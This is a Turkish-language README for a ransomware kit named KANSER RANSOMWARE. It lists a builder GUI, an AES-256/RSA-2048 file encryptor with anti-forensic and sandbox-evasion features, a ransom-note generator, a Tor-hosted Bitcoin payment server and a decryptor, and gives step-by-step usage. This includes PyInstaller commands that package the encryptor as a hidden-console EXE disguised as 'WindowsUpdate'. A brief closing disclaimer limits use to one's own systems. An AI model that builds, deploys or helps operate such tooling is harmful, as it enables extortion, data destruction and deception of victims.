# KANSER RANSOMWARE v1.0

AES-256-CBC + RSA-2048 tabanli dosya sifreleme fidye yazilimi. Multi-threaded sifreleme, anti-forensic ve anti-analysis ozellikleriyle gelir. Odeme takip sunucusu ve otomatik decrypt anahtar gonderimi destekler.

---

## Dosya Yapisi

| Dosya | Aciklama |
|-------|----------|
| `builder.py` | GUI tabanli ransomware olusturucu — anahtar uretimi, yapilandirma, EXE derleme |
| `crypter.py` | AES-256-CBC + RSA-2048 sifreleme motoru — coklu thread, anti-forensic |
| `decryptor.py` | Private key ile sifrelenmis dosyalari cozme araci |
| `ransom_note.py` | Fidye notu uretici — HTML, TXT, duvar kagidi degistirme |
| `server.py` | Tor uzerinden odeme takip sunucusu — SQLite tabanli, otomatik key gonderimi |
| `config.json` | Hedef dosya uzantilari, Bitcoin adresi, iletisim bilgileri |

---

## Ozellikler

- **AES-256-CBC** simetrik sifreleme (dosya bazinda rastgele IV)
- **RSA-2048** asimetrik sifreleme (AES anahtari RSA ile korunur)
- **Multi-threaded** — coklu CPU cekirdeginde paralel sifreleme
- **Anti-Forensic** — dosya zaman damgalarini sifirla, gecici dosyalari guvenli sil
- **Anti-Analysis** — sanal makine / sandbox tespiti
- **Odeme Takip Sunucusu** — SQLite tabanli, Bitcoin TX hash dogrulama
- **Otomatik Decrypt** — odeme onaylaninca decrypt anahtari otomatik gonderilir
- **Fidye Notu** — HTML sayfa, TXT dosyasi, duvar kagidi degistirme
- **Genisletilebilir Hedef** — `config.json` uzerinden 40+ dosya uzantisi

---

## Gereksinimler

```bash
cd KanserTools
pip install -r requirements.txt
pip install cryptography
```

---

## Kullanim

### 1. Builder (Ransomware Olusturma)

```bash
cd ransomware
python builder.py
```

GUI acilir. Sirasiyla:
1. **Keys** sekmesinde RSA anahtar cifti olustur
2. **Config** sekmesinde Bitcoin adresi, iletisim emaili, fidye miktari gir
3. **Target** sekmesinde hedef dosya uzantilarini sec
4. **Build** sekmesinde EXE olustur

### 2. Odeme Takip Sunucusu

```bash
python server.py
```

Port 8080'de HTTP sunucu baslatir. Odeme bildirimlerini alir, TX hash dogrular, onaylayinca decrypt anahtarini gonderir.

### 3. Dosya Cozme (Decryptor)

```bash
# Private key ile tum sifreli dosyalari coz:
python decryptor.py private_key.pem

# Belirli bir dizindeki dosyalari coz:
python decryptor.py private_key.pem /hedef/dizin
```

---

## EXE Builder (PyInstaller)

Builder GUI uzerinden veya manuel olarak:

```bash
# crypter.py + ransom_note.py birlestirilerek tek EXE:
pyinstaller --onefile --noconsole --name=WindowsUpdate crypter.py

# Server:
pyinstaller --onefile --name=PaymentServer server.py
```

---

## Monitor Reporter

`monitor_reporter.py`, ransomware motoru calistiginda otomatik import edilir. Sifreleme baslangici, tamamlanmasi, hata durumlari ve odeme bildirimleri merkezi olarak raporlanir.

```python
from monitor_reporter import report
report("Ransomware", "encryption_started", {"files_total": 1500})
```

---

## Guvenlik Uyarisi

Bu arac **yalnizca kendi sistemlerinizde ve egitim/test amaciyla** kullanilmalidir. Izinsiz kullanim yasa disidir.
